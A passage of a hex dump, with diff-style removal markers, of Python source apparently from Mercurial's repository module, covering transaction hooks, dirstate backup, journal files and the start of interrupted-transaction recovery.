-00016fd0: 2020 2020 2020 6c61 6d62 6461 3a20 4e6f        lambda: No
-00016fe0: 6e65 2c0a 2020 2020 2020 2020 2020 2020  ne,.            
-00016ff0: 7365 6c66 2e73 746f 7265 2e63 7265 6174  self.store.creat
-00017000: 656d 6f64 652c 0a20 2020 2020 2020 2020  emode,.         
-00017010: 2020 2076 616c 6964 6174 6f72 3d76 616c     validator=val
-00017020: 6964 6174 652c 0a20 2020 2020 2020 2020  idate,.         
-00017030: 2020 2072 656c 6561 7365 666e 3d72 656c     releasefn=rel
-00017040: 6561 7365 666e 2c0a 2020 2020 2020 2020  easefn,.        
-00017050: 2020 2020 6368 6563 6b61 6d62 6967 6669      checkambigfi
-00017060: 6c65 733d 5f63 6163 6865 6466 696c 6573  les=_cachedfiles
-00017070: 2c0a 2020 2020 2020 2020 2020 2020 6e61  ,.            na
-00017080: 6d65 3d64 6573 632c 0a20 2020 2020 2020  me=desc,.       
-00017090: 2029 0a20 2020 2020 2020 2066 6f72 2076   ).        for v
-000170a0: 6673 5f69 642c 2070 6174 6820 696e 2073  fs_id, path in s
-000170b0: 656c 662e 5f6a 6f75 726e 616c 6669 6c65  elf._journalfile
-000170c0: 7328 293a 0a20 2020 2020 2020 2020 2020  s():.           
-000170d0: 2074 722e 6164 645f 6a6f 7572 6e61 6c28   tr.add_journal(
-000170e0: 7666 735f 6964 2c20 7061 7468 290a 2020  vfs_id, path).  
-000170f0: 2020 2020 2020 7472 2e63 6861 6e67 6573        tr.changes
-00017100: 5b62 276f 7269 6772 6570 6f6c 656e 275d  [b'origrepolen']
-00017110: 203d 206c 656e 2873 656c 6629 0a20 2020   = len(self).   
-00017120: 2020 2020 2074 722e 6368 616e 6765 735b       tr.changes[
-00017130: 6227 6f62 736d 6172 6b65 7273 275d 203d  b'obsmarkers'] =
-00017140: 2073 6574 2829 0a20 2020 2020 2020 2074   set().        t
-00017150: 722e 6368 616e 6765 735b 6227 7068 6173  r.changes[b'phas
-00017160: 6573 275d 203d 205b 5d0a 2020 2020 2020  es'] = [].      
-00017170: 2020 7472 2e63 6861 6e67 6573 5b62 2762    tr.changes[b'b
-00017180: 6f6f 6b6d 6172 6b73 275d 203d 207b 7d0a  ookmarks'] = {}.
-00017190: 0a20 2020 2020 2020 2074 722e 686f 6f6b  .        tr.hook
-000171a0: 6172 6773 5b62 2774 786e 6964 275d 203d  args[b'txnid'] =
-000171b0: 2074 786e 6964 0a20 2020 2020 2020 2074   txnid.        t
-000171c0: 722e 686f 6f6b 6172 6773 5b62 2774 786e  r.hookargs[b'txn
-000171d0: 6e61 6d65 275d 203d 2064 6573 630a 2020  name'] = desc.  
-000171e0: 2020 2020 2020 7472 2e68 6f6f 6b61 7267        tr.hookarg
-000171f0: 735b 6227 6368 616e 6765 7327 5d20 3d20  s[b'changes'] = 
-00017200: 7472 2e63 6861 6e67 6573 0a20 2020 2020  tr.changes.     
-00017210: 2020 2023 206e 6f74 653a 2077 7269 7469     # note: writi
-00017220: 6e67 2074 6865 2066 6e63 6163 6865 206f  ng the fncache o
-00017230: 6e6c 7920 6475 7269 6e67 2066 696e 616c  nly during final
-00017240: 697a 6520 6d65 616e 2074 6861 7420 7468  ize mean that th
-00017250: 6520 6669 6c65 2069 730a 2020 2020 2020  e file is.      
-00017260: 2020 2320 6f75 7464 6174 6564 2077 6865    # outdated whe
-00017270: 6e20 7275 6e6e 696e 6720 686f 6f6b 732e  n running hooks.
-00017280: 2041 7320 666e 6361 6368 6520 6973 2075   As fncache is u
-00017290: 7365 6420 666f 7220 7374 7265 616d 696e  sed for streamin
-000172a0: 6720 636c 6f6e 652c 0a20 2020 2020 2020  g clone,.       
-000172b0: 2023 2074 6869 7320 6973 206e 6f74 2065   # this is not e
-000172c0: 7870 6563 7465 6420 746f 2062 7265 616b  xpected to break
-000172d0: 2061 6e79 7468 696e 6720 7468 6174 2068   anything that h
-000172e0: 6170 7065 6e20 6475 7269 6e67 2074 6865  appen during the
-000172f0: 2068 6f6f 6b73 2e0a 2020 2020 2020 2020   hooks..        
-00017300: 7472 2e61 6464 6669 6e61 6c69 7a65 2862  tr.addfinalize(b
-00017310: 2766 6c75 7368 2d66 6e63 6163 6865 272c  'flush-fncache',
-00017320: 2073 656c 662e 7374 6f72 652e 7772 6974   self.store.writ
-00017330: 6529 0a0a 2020 2020 2020 2020 6465 6620  e)..        def 
-00017340: 7478 6e63 6c6f 7365 686f 6f6b 2874 7232  txnclosehook(tr2
-00017350: 293a 0a20 2020 2020 2020 2020 2020 2022  ):.            "
-00017360: 2222 546f 2062 6520 7275 6e20 6966 2074  ""To be run if t
-00017370: 7261 6e73 6163 7469 6f6e 2069 7320 7375  ransaction is su
-00017380: 6363 6573 7366 756c 2c20 7769 6c6c 2073  ccessful, will s
-00017390: 6368 6564 756c 6520 6120 686f 6f6b 2072  chedule a hook r
-000173a0: 756e 2222 220a 2020 2020 2020 2020 2020  un""".          
-000173b0: 2020 2320 446f 6e27 7420 7265 6665 7265    # Don't refere
-000173c0: 6e63 6520 7472 3220 696e 2068 6f6f 6b28  nce tr2 in hook(
-000173d0: 2920 736f 2077 6520 646f 6e27 7420 686f  ) so we don't ho
-000173e0: 6c64 2061 2072 6566 6572 656e 6365 2e0a  ld a reference..
-000173f0: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
-00017400: 6973 2072 6564 7563 6573 206d 656d 6f72  is reduces memor
-00017410: 7920 636f 6e73 756d 7074 696f 6e20 7768  y consumption wh
-00017420: 656e 2074 6865 7265 2061 7265 206d 756c  en there are mul
-00017430: 7469 706c 650a 2020 2020 2020 2020 2020  tiple.          
-00017440: 2020 2320 7472 616e 7361 6374 696f 6e73    # transactions
-00017450: 2070 6572 206c 6f63 6b2e 2054 6869 7320   per lock. This 
-00017460: 6361 6e20 6c69 6b65 6c79 2067 6f20 6177  can likely go aw
-00017470: 6179 2069 6620 6973 7375 6535 3034 350a  ay if issue5045.
-00017480: 2020 2020 2020 2020 2020 2020 2320 6669              # fi
-00017490: 7865 7320 7468 6520 6675 6e63 7469 6f6e  xes the function
-000174a0: 2061 6363 756d 756c 6174 696f 6e2e 0a20   accumulation.. 
-000174b0: 2020 2020 2020 2020 2020 2068 6f6f 6b61             hooka
-000174c0: 7267 7320 3d20 7472 322e 686f 6f6b 6172  rgs = tr2.hookar
-000174d0: 6773 0a0a 2020 2020 2020 2020 2020 2020  gs..            
-000174e0: 6465 6620 686f 6f6b 6675 6e63 2875 6e75  def hookfunc(unu
-000174f0: 7365 645f 7375 6363 6573 7329 3a0a 2020  sed_success):.  
-00017500: 2020 2020 2020 2020 2020 2020 2020 7265                re
-00017510: 706f 203d 2072 6570 6f72 6566 2829 0a20  po = reporef(). 
-00017520: 2020 2020 2020 2020 2020 2020 2020 2061                 a
-00017530: 7373 6572 7420 7265 706f 2069 7320 6e6f  ssert repo is no
-00017540: 7420 4e6f 6e65 2020 2320 6865 6c70 2070  t None  # help p
-00017550: 7974 7970 650a 0a20 2020 2020 2020 2020  ytype..         
-00017560: 2020 2020 2020 2069 6620 686f 6f6b 2e68         if hook.h
-00017570: 6173 686f 6f6b 2872 6570 6f2e 7569 2c20  ashook(repo.ui, 
-00017580: 6227 7478 6e63 6c6f 7365 2d62 6f6f 6b6d  b'txnclose-bookm
-00017590: 6172 6b27 293a 0a20 2020 2020 2020 2020  ark'):.         
-000175a0: 2020 2020 2020 2020 2020 2062 6d63 6861             bmcha
-000175b0: 6e67 6573 203d 2073 6f72 7465 6428 7472  nges = sorted(tr
-000175c0: 2e63 6861 6e67 6573 5b62 2762 6f6f 6b6d  .changes[b'bookm
-000175d0: 6172 6b73 275d 2e69 7465 6d73 2829 290a  arks'].items()).
-000175e0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000175f0: 2020 2020 666f 7220 6e61 6d65 2c20 286f      for name, (o
-00017600: 6c64 2c20 6e65 7729 2069 6e20 626d 6368  ld, new) in bmch
-00017610: 616e 6765 733a 0a20 2020 2020 2020 2020  anges:.         
-00017620: 2020 2020 2020 2020 2020 2020 2020 2061                 a
-00017630: 7267 7320 3d20 7472 2e68 6f6f 6b61 7267  rgs = tr.hookarg
-00017640: 732e 636f 7079 2829 0a20 2020 2020 2020  s.copy().       
-00017650: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017660: 2061 7267 732e 7570 6461 7465 2862 6f6f   args.update(boo
-00017670: 6b6d 6172 6b73 2e70 7265 7061 7265 686f  kmarks.prepareho
-00017680: 6f6b 6172 6773 286e 616d 652c 206f 6c64  okargs(name, old
-00017690: 2c20 6e65 7729 290a 2020 2020 2020 2020  , new)).        
-000176a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000176b0: 7265 706f 2e68 6f6f 6b28 0a20 2020 2020  repo.hook(.     
-000176c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000176d0: 2020 2020 2020 2062 2774 786e 636c 6f73         b'txnclos
-000176e0: 652d 626f 6f6b 6d61 726b 272c 0a20 2020  e-bookmark',.   
-000176f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017700: 2020 2020 2020 2020 2074 6872 6f77 3d46           throw=F
-00017710: 616c 7365 2c0a 2020 2020 2020 2020 2020  alse,.          
-00017720: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017730: 2020 2a2a 7079 636f 6d70 6174 2e73 7472    **pycompat.str
-00017740: 6b77 6172 6773 2861 7267 7329 0a20 2020  kwargs(args).   
-00017750: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017760: 2020 2020 2029 0a0a 2020 2020 2020 2020       )..        
-00017770: 2020 2020 2020 2020 6966 2068 6f6f 6b2e          if hook.
-00017780: 6861 7368 6f6f 6b28 7265 706f 2e75 692c  hashook(repo.ui,
-00017790: 2062 2774 786e 636c 6f73 652d 7068 6173   b'txnclose-phas
-000177a0: 6527 293a 0a20 2020 2020 2020 2020 2020  e'):.           
-000177b0: 2020 2020 2020 2020 2063 6c20 3d20 7265           cl = re
-000177c0: 706f 2e75 6e66 696c 7465 7265 6428 292e  po.unfiltered().
-000177d0: 6368 616e 6765 6c6f 670a 2020 2020 2020  changelog.      
-000177e0: 2020 2020 2020 2020 2020 2020 2020 7068                ph
-000177f0: 6173 656d 7620 3d20 736f 7274 6564 280a  asemv = sorted(.
-00017800: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017810: 2020 2020 2020 2020 7472 2e63 6861 6e67          tr.chang
-00017820: 6573 5b62 2770 6861 7365 7327 5d2c 206b  es[b'phases'], k
-00017830: 6579 3d6c 616d 6264 6120 723a 2072 5b30  ey=lambda r: r[0
-00017840: 5d5b 305d 0a20 2020 2020 2020 2020 2020  ][0].           
-00017850: 2020 2020 2020 2020 2029 0a20 2020 2020           ).     
-00017860: 2020 2020 2020 2020 2020 2020 2020 2066                 f
-00017870: 6f72 2072 6576 732c 2028 6f6c 642c 206e  or revs, (old, n
-00017880: 6577 2920 696e 2070 6861 7365 6d76 3a0a  ew) in phasemv:.
-00017890: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000178a0: 2020 2020 2020 2020 666f 7220 7265 7620          for rev 
-000178b0: 696e 2072 6576 733a 0a20 2020 2020 2020  in revs:.       
-000178c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000178d0: 2020 2020 2061 7267 7320 3d20 7472 2e68       args = tr.h
-000178e0: 6f6f 6b61 7267 732e 636f 7079 2829 0a20  ookargs.copy(). 
-000178f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017900: 2020 2020 2020 2020 2020 206e 6f64 6520             node 
-00017910: 3d20 6865 7828 636c 2e6e 6f64 6528 7265  = hex(cl.node(re
-00017920: 7629 290a 2020 2020 2020 2020 2020 2020  v)).            
-00017930: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017940: 6172 6773 2e75 7064 6174 6528 7068 6173  args.update(phas
-00017950: 6573 2e70 7265 7061 7265 686f 6f6b 6172  es.preparehookar
-00017960: 6773 286e 6f64 652c 206f 6c64 2c20 6e65  gs(node, old, ne
-00017970: 7729 290a 2020 2020 2020 2020 2020 2020  w)).            
-00017980: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017990: 7265 706f 2e68 6f6f 6b28 0a20 2020 2020  repo.hook(.     
-000179a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000179b0: 2020 2020 2020 2020 2020 2062 2774 786e             b'txn
-000179c0: 636c 6f73 652d 7068 6173 6527 2c0a 2020  close-phase',.  
-000179d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000179e0: 2020 2020 2020 2020 2020 2020 2020 7468                th
-000179f0: 726f 773d 4661 6c73 652c 0a20 2020 2020  row=False,.     
-00017a00: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017a10: 2020 2020 2020 2020 2020 202a 2a70 7963             **pyc
-00017a20: 6f6d 7061 742e 7374 726b 7761 7267 7328  ompat.strkwargs(
-00017a30: 6172 6773 290a 2020 2020 2020 2020 2020  args).          
-00017a40: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017a50: 2020 290a 0a20 2020 2020 2020 2020 2020    )..           
-00017a60: 2020 2020 2072 6570 6f2e 686f 6f6b 280a       repo.hook(.
-00017a70: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00017a80: 2020 2020 6227 7478 6e63 6c6f 7365 272c      b'txnclose',
-00017a90: 2074 6872 6f77 3d46 616c 7365 2c20 2a2a   throw=False, **
-00017aa0: 7079 636f 6d70 6174 2e73 7472 6b77 6172  pycompat.strkwar
-00017ab0: 6773 2868 6f6f 6b61 7267 7329 0a20 2020  gs(hookargs).   
-00017ac0: 2020 2020 2020 2020 2020 2020 2029 0a0a               )..
-00017ad0: 2020 2020 2020 2020 2020 2020 7265 706f              repo
-00017ae0: 203d 2072 6570 6f72 6566 2829 0a20 2020   = reporef().   
-00017af0: 2020 2020 2020 2020 2061 7373 6572 7420           assert 
-00017b00: 7265 706f 2069 7320 6e6f 7420 4e6f 6e65  repo is not None
-00017b10: 2020 2320 6865 6c70 2070 7974 7970 650a    # help pytype.
-00017b20: 2020 2020 2020 2020 2020 2020 7265 706f              repo
-00017b30: 2e5f 6166 7465 726c 6f63 6b28 686f 6f6b  ._afterlock(hook
-00017b40: 6675 6e63 290a 0a20 2020 2020 2020 2074  func)..        t
-00017b50: 722e 6164 6466 696e 616c 697a 6528 6227  r.addfinalize(b'
-00017b60: 7478 6e63 6c6f 7365 2d68 6f6f 6b27 2c20  txnclose-hook', 
-00017b70: 7478 6e63 6c6f 7365 686f 6f6b 290a 2020  txnclosehook).  
-00017b80: 2020 2020 2020 2320 496e 636c 7564 6520        # Include 
-00017b90: 6120 6c65 6164 696e 6720 222d 2220 746f  a leading "-" to
-00017ba0: 206d 616b 6520 6974 2068 6170 7065 6e20   make it happen 
-00017bb0: 6265 666f 7265 2074 6865 2074 7261 6e73  before the trans
-00017bc0: 6163 7469 6f6e 2073 756d 6d61 7279 0a20  action summary. 
-00017bd0: 2020 2020 2020 2023 2072 6570 6f72 7473         # reports
-00017be0: 2072 6567 6973 7465 7265 6420 7669 6120   registered via 
-00017bf0: 7363 6d75 7469 6c2e 7265 6769 7374 6572  scmutil.register
-00017c00: 7375 6d6d 6172 7963 616c 6c62 6163 6b28  summarycallback(
-00017c10: 2920 7768 6f73 6520 6e61 6d65 730a 2020  ) whose names.  
-00017c20: 2020 2020 2020 2320 6172 6520 3030 2d74        # are 00-t
-00017c30: 786e 7265 706f 7274 2065 7463 2e20 5468  xnreport etc. Th
-00017c40: 6174 2077 6179 2c20 7468 6520 6361 6368  at way, the cach
-00017c50: 6573 2077 696c 6c20 6265 2077 6172 6d20  es will be warm 
-00017c60: 7768 656e 2074 6865 0a20 2020 2020 2020  when the.       
-00017c70: 2023 2063 616c 6c62 6163 6b73 2072 756e   # callbacks run
-00017c80: 2e0a 2020 2020 2020 2020 7472 2e61 6464  ..        tr.add
-00017c90: 706f 7374 636c 6f73 6528 6227 2d77 6172  postclose(b'-war
-00017ca0: 6d2d 6361 6368 6527 2c20 7365 6c66 2e5f  m-cache', self._
-00017cb0: 6275 696c 6463 6163 6865 7570 6461 7465  buildcacheupdate
-00017cc0: 7228 7472 2929 0a0a 2020 2020 2020 2020  r(tr))..        
-00017cd0: 6465 6620 7478 6e61 626f 7274 686f 6f6b  def txnaborthook
-00017ce0: 2874 7232 293a 0a20 2020 2020 2020 2020  (tr2):.         
-00017cf0: 2020 2022 2222 546f 2062 6520 7275 6e20     """To be run 
-00017d00: 6966 2074 7261 6e73 6163 7469 6f6e 2069  if transaction i
-00017d10: 7320 6162 6f72 7465 6422 2222 0a20 2020  s aborted""".   
-00017d20: 2020 2020 2020 2020 2072 6570 6f20 3d20           repo = 
-00017d30: 7265 706f 7265 6628 290a 2020 2020 2020  reporef().      
-00017d40: 2020 2020 2020 6173 7365 7274 2072 6570        assert rep
-00017d50: 6f20 6973 206e 6f74 204e 6f6e 6520 2023  o is not None  #
-00017d60: 2068 656c 7020 7079 7479 7065 0a20 2020   help pytype.   
-00017d70: 2020 2020 2020 2020 2072 6570 6f2e 686f           repo.ho
-00017d80: 6f6b 280a 2020 2020 2020 2020 2020 2020  ok(.            
-00017d90: 2020 2020 6227 7478 6e61 626f 7274 272c      b'txnabort',
-00017da0: 2074 6872 6f77 3d46 616c 7365 2c20 2a2a   throw=False, **
-00017db0: 7079 636f 6d70 6174 2e73 7472 6b77 6172  pycompat.strkwar
-00017dc0: 6773 2874 7232 2e68 6f6f 6b61 7267 7329  gs(tr2.hookargs)
-00017dd0: 0a20 2020 2020 2020 2020 2020 2029 0a0a  .            )..
-00017de0: 2020 2020 2020 2020 7472 2e61 6464 6162          tr.addab
-00017df0: 6f72 7428 6227 7478 6e61 626f 7274 2d68  ort(b'txnabort-h
-00017e00: 6f6f 6b27 2c20 7478 6e61 626f 7274 686f  ook', txnabortho
-00017e10: 6f6b 290a 2020 2020 2020 2020 2320 6176  ok).        # av
-00017e20: 6f69 6420 6561 6765 7220 6361 6368 6520  oid eager cache 
-00017e30: 696e 7661 6c69 6461 7469 6f6e 2e20 696e  invalidation. in
-00017e40: 2d6d 656d 6f72 7920 6461 7461 2073 686f  -memory data sho
-00017e50: 756c 6420 6265 2069 6465 6e74 6963 616c  uld be identical
-00017e60: 0a20 2020 2020 2020 2023 2074 6f20 7374  .        # to st
-00017e70: 6f72 6564 2064 6174 6120 6966 2074 7261  ored data if tra
-00017e80: 6e73 6163 7469 6f6e 2068 6173 206e 6f20  nsaction has no 
-00017e90: 6572 726f 722e 0a20 2020 2020 2020 2074  error..        t
-00017ea0: 722e 6164 6470 6f73 7463 6c6f 7365 2862  r.addpostclose(b
-00017eb0: 2772 6566 7265 7368 2d66 696c 6563 6163  'refresh-filecac
-00017ec0: 6865 7374 6174 7327 2c20 7365 6c66 2e5f  hestats', self._
-00017ed0: 7265 6672 6573 6866 696c 6563 6163 6865  refreshfilecache
-00017ee0: 7374 6174 7329 0a20 2020 2020 2020 2073  stats).        s
-00017ef0: 656c 662e 5f74 7261 6e73 7265 6620 3d20  elf._transref = 
-00017f00: 7765 616b 7265 662e 7265 6628 7472 290a  weakref.ref(tr).
-00017f10: 2020 2020 2020 2020 7363 6d75 7469 6c2e          scmutil.
-00017f20: 7265 6769 7374 6572 7375 6d6d 6172 7963  registersummaryc
-00017f30: 616c 6c62 6163 6b28 7365 6c66 2c20 7472  allback(self, tr
-00017f40: 2c20 6465 7363 290a 2020 2020 2020 2020  , desc).        
-00017f50: 2320 5468 6973 206f 6e6c 7920 6578 6973  # This only exis
-00017f60: 7420 746f 2064 6561 6c20 7769 7468 2074  t to deal with t
-00017f70: 6865 206e 6565 6420 6f66 2072 6f6c 6c62  he need of rollb
-00017f80: 6163 6b20 746f 2068 6176 6520 7669 6162  ack to have viab
-00017f90: 6c65 0a20 2020 2020 2020 2023 2070 6172  le.        # par
-00017fa0: 656e 7473 2061 7420 7468 6520 656e 6420  ents at the end 
-00017fb0: 6f66 2074 6865 206f 7065 7261 7469 6f6e  of the operation
-00017fc0: 2e20 536f 2062 6163 6b75 7020 7669 6162  . So backup viab
-00017fd0: 6c65 2070 6172 656e 7473 2061 7420 7468  le parents at th
-00017fe0: 650a 2020 2020 2020 2020 2320 7469 6d65  e.        # time
-00017ff0: 206f 6620 7468 6973 206f 7065 7261 7469   of this operati
-00018000: 6f6e 2e0a 2020 2020 2020 2020 230a 2020  on..        #.  
-00018010: 2020 2020 2020 2320 5765 206f 6e6c 7920        # We only 
-00018020: 646f 2069 7420 7768 656e 2074 6865 2060  do it when the `
-00018030: 776c 6f63 6b60 2069 7320 7461 6b65 6e2c  wlock` is taken,
-00018040: 206f 7468 6572 7769 7365 206f 7468 6572   otherwise other
-00018050: 206d 6967 6874 2062 650a 2020 2020 2020   might be.      
-00018060: 2020 2320 616c 7465 7269 6e67 2074 6865    # altering the
-00018070: 2064 6972 7374 6174 6520 756e 6465 7220   dirstate under 
-00018080: 7573 2e0a 2020 2020 2020 2020 230a 2020  us..        #.  
-00018090: 2020 2020 2020 2320 5468 6973 2069 7320        # This is 
-000180a0: 7265 616c 6c79 206e 6f74 2061 2067 7265  really not a gre
-000180b0: 6174 2077 6179 2074 6f20 646f 2074 6869  at way to do thi
-000180c0: 7320 2866 6972 7374 2c20 6265 6361 7573  s (first, becaus
-000180d0: 6520 7765 2063 616e 6e6f 740a 2020 2020  e we cannot.    
-000180e0: 2020 2020 2320 616c 7761 7973 2064 6f20      # always do 
-000180f0: 6974 292e 2054 6865 7265 2061 7265 206d  it). There are m
-00018100: 6f72 6520 7669 6162 6c65 2061 6c74 6572  ore viable alter
-00018110: 6e61 7469 7665 2074 6861 7420 6578 6973  native that exis
-00018120: 7473 0a20 2020 2020 2020 2023 0a20 2020  ts.        #.   
-00018130: 2020 2020 2023 202d 2062 6163 6b69 6e67       # - backing
-00018140: 206f 6e6c 7920 7468 6520 776f 726b 696e   only the workin
-00018150: 6720 636f 7079 2070 6172 656e 7420 696e  g copy parent in
-00018160: 2061 2064 6564 6963 6174 6564 2066 696c   a dedicated fil
-00018170: 6573 2061 6e64 2064 6f69 6e67 0a20 2020  es and doing.   
-00018180: 2020 2020 2023 2020 2061 2063 6c65 616e       #   a clean
-00018190: 2022 6b65 6570 2d75 7064 6174 6522 2074   "keep-update" t
-000181a0: 6f20 7468 656d 206f 6e20 6068 6720 726f  o them on `hg ro
-000181b0: 6c6c 6261 636b 602e 0a20 2020 2020 2020  llback`..       
-000181c0: 2023 0a20 2020 2020 2020 2023 202d 2073   #.        # - s
-000181d0: 6c69 6768 746c 7920 6368 616e 6769 6e67  lightly changing
-000181e0: 2074 6865 2062 6568 6176 696f 7220 616e   the behavior an
-000181f0: 2061 7070 6c79 696e 6720 6120 6c6f 6769   applying a logi
-00018200: 6320 7369 6d69 6c61 7220 746f 2022 6867  c similar to "hg
-00018210: 0a20 2020 2020 2020 2023 2073 7472 6970  .        # strip
-00018220: 2220 746f 2070 6963 6b20 6120 776f 726b  " to pick a work
-00018230: 696e 6720 636f 7079 2064 6573 7469 6e61  ing copy destina
-00018240: 7469 6f6e 206f 6e20 6068 6720 726f 6c6c  tion on `hg roll
-00018250: 6261 636b 600a 2020 2020 2020 2020 6966  back`.        if
-00018260: 2073 656c 662e 6375 7272 656e 7477 6c6f   self.currentwlo
-00018270: 636b 2829 2069 7320 6e6f 7420 4e6f 6e65  ck() is not None
-00018280: 3a0a 2020 2020 2020 2020 2020 2020 6473  :.            ds
-00018290: 203d 2073 656c 662e 6469 7273 7461 7465   = self.dirstate
-000182a0: 0a20 2020 2020 2020 2020 2020 2069 6620  .            if 
-000182b0: 6e6f 7420 7365 6c66 2e76 6673 2e65 7869  not self.vfs.exi
-000182c0: 7374 7328 6227 6272 616e 6368 2729 3a0a  sts(b'branch'):.
-000182d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000182e0: 2320 666f 7263 6520 6120 6669 6c65 2074  # force a file t
-000182f0: 6f20 6265 2077 7269 7474 656e 2069 6620  o be written if 
-00018300: 4e6f 6e65 2065 7869 7374 0a20 2020 2020  None exist.     
-00018310: 2020 2020 2020 2020 2020 2064 732e 7365             ds.se
-00018320: 7462 7261 6e63 6828 6227 6465 6661 756c  tbranch(b'defaul
-00018330: 7427 2c20 4e6f 6e65 290a 0a20 2020 2020  t', None)..     
-00018340: 2020 2020 2020 2064 6566 2062 6163 6b75         def backu
-00018350: 705f 6469 7273 7461 7465 2874 7229 3a0a  p_dirstate(tr):.
-00018360: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00018370: 666f 7220 6620 696e 2064 732e 616c 6c5f  for f in ds.all_
-00018380: 6669 6c65 5f6e 616d 6573 2829 3a0a 2020  file_names():.  
-00018390: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000183a0: 2020 2320 6861 7264 6c69 6e6b 2062 6163    # hardlink bac
-000183b0: 6b75 7020 6973 206f 6b61 7920 6265 6361  kup is okay beca
-000183c0: 7573 6520 6064 6972 7374 6174 6560 2069  use `dirstate` i
-000183d0: 7320 616c 7761 7973 0a20 2020 2020 2020  s always.       
-000183e0: 2020 2020 2020 2020 2020 2020 2023 2061               # a
-000183f0: 746f 6d69 6361 6c6c 7920 7772 6974 7465  tomically writte
-00018400: 6e20 616e 6420 706f 7373 6962 6c65 2064  n and possible d
-00018410: 6174 6120 6669 6c65 2061 7265 2061 7070  ata file are app
-00018420: 656e 6420 6f6e 6c79 0a20 2020 2020 2020  end only.       
-00018430: 2020 2020 2020 2020 2020 2020 2023 2061               # a
-00018440: 6e64 2072 6573 6973 7461 6e74 2074 6f20  nd resistant to 
-00018450: 7472 6169 6c69 6e67 2064 6174 612e 0a20  trailing data.. 
-00018460: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00018470: 2020 2074 722e 6164 6462 6163 6b75 7028     tr.addbackup(
-00018480: 662c 2068 6172 646c 696e 6b3d 5472 7565  f, hardlink=True
-00018490: 2c20 6c6f 6361 7469 6f6e 3d62 2770 6c61  , location=b'pla
-000184a0: 696e 2729 0a0a 2020 2020 2020 2020 2020  in')..          
-000184b0: 2020 7472 2e61 6464 7661 6c69 6461 746f    tr.addvalidato
-000184c0: 7228 6227 6469 7273 7461 7465 2d62 6163  r(b'dirstate-bac
-000184d0: 6b75 7027 2c20 6261 636b 7570 5f64 6972  kup', backup_dir
-000184e0: 7374 6174 6529 0a20 2020 2020 2020 2072  state).        r
-000184f0: 6574 7572 6e20 7472 0a0a 2020 2020 6465  eturn tr..    de
-00018500: 6620 5f6a 6f75 726e 616c 6669 6c65 7328  f _journalfiles(
-00018510: 7365 6c66 293a 0a20 2020 2020 2020 2072  self):.        r
-00018520: 6574 7572 6e20 280a 2020 2020 2020 2020  eturn (.        
-00018530: 2020 2020 2873 656c 662e 7376 6673 2c20      (self.svfs, 
-00018540: 6227 6a6f 7572 6e61 6c27 292c 0a20 2020  b'journal'),.   
-00018550: 2020 2020 2020 2020 2028 7365 6c66 2e76           (self.v
-00018560: 6673 2c20 6227 6a6f 7572 6e61 6c2e 6465  fs, b'journal.de
-00018570: 7363 2729 2c0a 2020 2020 2020 2020 290a  sc'),.        ).
-00018580: 0a20 2020 2064 6566 2075 6e64 6f66 696c  .    def undofil
-00018590: 6573 2873 656c 6629 3a0a 2020 2020 2020  es(self):.      
-000185a0: 2020 7265 7475 726e 205b 2876 6673 2c20    return [(vfs, 
-000185b0: 756e 646f 6e61 6d65 2878 2929 2066 6f72  undoname(x)) for
-000185c0: 2076 6673 2c20 7820 696e 2073 656c 662e   vfs, x in self.
-000185d0: 5f6a 6f75 726e 616c 6669 6c65 7328 295d  _journalfiles()]
-000185e0: 0a0a 2020 2020 4075 6e66 696c 7465 7265  ..    @unfiltere
-000185f0: 646d 6574 686f 640a 2020 2020 6465 6620  dmethod.    def 
-00018600: 5f77 7269 7465 6a6f 7572 6e61 6c28 7365  _writejournal(se
-00018610: 6c66 2c20 6465 7363 293a 0a20 2020 2020  lf, desc):.     
-00018620: 2020 2073 656c 662e 7666 732e 7772 6974     self.vfs.writ
-00018630: 6528 6222 6a6f 7572 6e61 6c2e 6465 7363  e(b"journal.desc
-00018640: 222c 2062 2225 645c 6e25 735c 6e22 2025  ", b"%d\n%s\n" %
-00018650: 2028 6c65 6e28 7365 6c66 292c 2064 6573   (len(self), des
-00018660: 6329 290a 0a20 2020 2064 6566 2072 6563  c))..    def rec
-00018670: 6f76 6572 2873 656c 6629 3a0a 2020 2020  over(self):.    
-00018680: 2020 2020 7769 7468 2073 656c 662e 6c6f      with self.lo
-00018690: 636b 2829 3a0a 2020 2020 2020 2020 2020  ck():.          
-000186a0: 2020 6966 2073 656c 662e 7376 6673 2e65    if self.svfs.e
-000186b0: 7869 7374 7328 6222 6a6f 7572 6e61 6c22  xists(b"journal"
-000186c0: 293a 0a20 2020 2020 2020 2020 2020 2020  ):.             
-000186d0: 2020 2073 656c 662e 7569 2e73 7461 7475     self.ui.statu
-000186e0: 7328 5f28 6222 726f 6c6c 696e 6720 6261  s(_(b"rolling ba
-000186f0: 636b 2069 6e74 6572 7275 7074 6564 2074  ck interrupted t
-00018700: 7261 6e73 6163 7469 6f6e 5c6e 2229 290a  ransaction\n")).
-00018710: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00018720: 7666 736d 6170 203d 2073 656c 662e 7666  vfsmap = self.vf
-00018730: 735f 6d61 700a 2020 2020 2020 2020 2020  s_map.          
-00018740: 2020 2020 2020 7472 616e 7361 6374 696f        transactio
-00018750: 6e2e 726f 6c6c 6261 636b 280a 2020 2020  n.rollback(.    
-00018760: 2020 2020 2020 2020 2020 2020 2020 2020                  
